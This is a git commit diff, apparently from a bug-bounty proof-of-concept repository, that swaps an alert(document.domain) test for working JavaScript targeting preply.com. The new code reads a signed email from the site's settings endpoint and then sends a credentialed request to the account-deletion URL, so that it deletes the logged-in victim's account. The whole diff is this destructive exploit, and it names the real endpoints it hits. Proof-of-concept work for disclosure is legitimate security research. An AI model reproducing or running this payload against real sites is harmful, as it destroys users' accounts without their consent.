6e8fce38b6d2c1ff9d11ac84e57460ca267625cc
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-02-05 19:16:40 +0100

    Update tutor1.js

--- poc/preply/tutor1.js
+++ poc/preply/tutor1.js
@@ -1,1 +1,27 @@
-alert(document.domain);
+pre_url = "https://preply.com/settings_initial_data/"
+delete_url = "https://preply.com/en/delete_account/"
+
+function delete_completed() {
+  alert("Account is deleted !!!");
+}
+
+function submit_delete(signed_email) {
+  req = new XMLHttpRequest();
+  req.open('GET', delete_url+signed_email, true);
+  req.withCredentials = true;
+  req.onload = function () {
+    delete_completed();
+  };
+  req.send(null);
+
+}
+
+req = new XMLHttpRequest();
+req.responseType = 'json';
+req.open('GET', pre_url, true);
+req.onload = function () {
+  var jsonResponse = req.response;
+  signed_email = jsonResponse.signed_email.split(":")[1];
+  submit_delete(signed_email)
+};
+req.send(null);
